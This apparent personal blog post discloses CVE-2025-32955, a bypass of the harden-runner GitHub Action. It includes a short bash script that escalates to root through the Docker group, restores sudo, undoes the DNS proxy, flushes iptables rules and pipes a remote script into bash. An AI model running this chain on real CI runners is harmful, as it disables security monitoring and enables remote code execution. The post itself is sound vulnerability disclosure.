---
layout: post
title: "Is harden-runner really securing your GitHub workflows?"
date: 2025-04-23 14:39:49 +0000
categories: [Security, GitHub Actions]
tags: [github-actions, security, cve, harden-runner, ci-cd]
---

What is the best way for a security guy to start a new blog? Probably sharing the first CVE that I found! 

I already published a blog post [here](https://sysdig.com/blog/security-mechanism-bypass-in-harden-runner-github-action/) about the latest [CVE-2025-32955](https://nvd.nist.gov/vuln/detail/CVE-2025-32955) vulnerability, but I wanted to add some more thoughts about it in my personal blog to just keep record of it and give more context.

During the last months I spent some time instructing myself on CI/CD security, especially on GitHub Actions, since I always loved to work in public, open-source repositories. While working on a project to use [Falco](https://falco.org) to gain visibility on GitHub workflows (at the end of the day, GitHub-hosted runners are just Linux machines), I started taking a look around to see how other projects/companies were addressing the problem. 

During this investigation, I stumbled upon [StepSecurity harden-runner](https://github.com/step-security/harden-runner). This is the most widespread product I found, it's used in a lot of open-source repositories and important projects. It has to be said that it really helped finding interesting real world attacks, especially thanks to their features allowing to audit or even block egress traffic using an [agent](https://github.com/step-security/agent) written in Go -- but probably the way these kind of solutions work isn't enough, since it turned out that a more motivated attacker can circumvent and turn off any security control in place. I talked about this with [Adnan Khan](https://adnanthekhan.com/), one of the best security researchers in this domain, and he confirmed my doubts. This led me to try to find an actual way to prove my thesis.

The main problem with these tools is that their security model is fundamentally broken. In a GitHub Actions environment, attackers can and will gain remote code execution in many subtle ways. Think about projects like [Living Off the Pipeline](https://boostsecurityio.github.io/lotp/) and check how many ways are out there to run untrusted code, following an "innocent" repo checkout on a PR or a workflow injection. 

So, now that we know attackers will execute their code, what is actually differentiating the code run by them and the one run by harden-runner? Well, just nothing. Will the software that is meant to monitor and secure your workflow be safe from potential tampering? Nope, of course.

You can read the details about the vulnerable code in the [Sysdig blog post](https://sysdig.com/blog/security-mechanism-bypass-in-harden-runner-github-action/), but basically the main features of the agent (that is auditing or blocking egress traffic both at the DNS and IP level), was implemented by:
1. Spawning a local DNS proxy, used to monitor/block all DNS queries. The `systemd-resolve` service is stopped, reconfigured to use the proxy, and the old configuration backed up in `/tmp`.
2. Creating simple iptables rules, both for host and containers.

To protect the agent inside the runner VM, StepSecurity implemented a feature called `disable-sudo`. By default, the `runner` Linux user inside the VM can run any arbitrary command via `sudo` thanks to the configuration in `/etc/sudoers.d/runner` file. The `disable-sudo` policy just limits itself to move the sudoers file for the user in `/tmp`, making it impossible to run `sudo` commands again. So everything is okay right? Nope! We just needed to find a way to escalate privileges in a different ways. How? 

1. Applying my knowledge about GHA. If you are a user of this product, you know that GitHub actions can be of three types: composite, JavaScript and Docker actions.
2. Remebering a good old friend, the [Docker GTFObin](https://gtfobins.github.io/gtfobins/docker/). 

Being part of the Docker group means being root, and of course since the runner must be able to run containers (Docker actions), so we must be inside that group. A quick execution of `id` inside the runner shell confirmed that we are indeed part of it.

So, at the end of the day it all boils down to:

```bash
# Restore sudo access via Docker privilege escalation, mounting the host filesystem 
# and operating as root inside it
docker run \
    --rm --privileged \
    -v /:/host \
    ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"

# Restore old DNS systemd configuration, disabling harden-runner proxy
sudo systemctl stop systemd-resolved
sudo cp /tmp/resolved.conf /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Remove harden runner iptables rules
sudo iptables -t filter -F OUTPUT
sudo iptables -t filter -F DOCKER-USER

# Do mess undisturbed
curl -sSfL <GIST_URL> | bash
```

The mitigation that StepSecurity proposed is described [here](https://www.stepsecurity.io/blog/evolving-harden-runners-disable-sudo-policy-for-improved-runner-security), but basically they evolved the `disable-sudo` feature to `disable-sudo-and-containers`, disinstalling Docker altogether, so that the privilege escaltion cannot be performed anymore. I still believe that there might be some more subtle ways to gain root inside the runner, and I will continue to research about it. 

Of course disinstalling Docker is just a mitigation and it's something that is limiting the features offered by GHA. I hope this CVE will serve to lead the security community to think of better ways to protect agents from tampering in such environments.

Thanks for reading, hope you enjoyed!